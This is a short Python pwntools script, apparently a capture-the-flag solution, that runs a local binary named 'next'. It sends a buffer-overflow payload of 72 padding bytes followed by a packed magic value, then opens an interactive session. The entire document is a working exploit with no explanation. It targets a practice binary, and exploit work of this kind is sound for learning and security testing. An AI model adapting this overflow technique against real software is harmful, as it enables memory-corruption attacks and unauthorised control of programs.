from pwn import *

p = process('./next')

magic = p64(0x3839736f7265)
payload = b'A'*72 + magic

p.sendline(payload)
p.interactive()
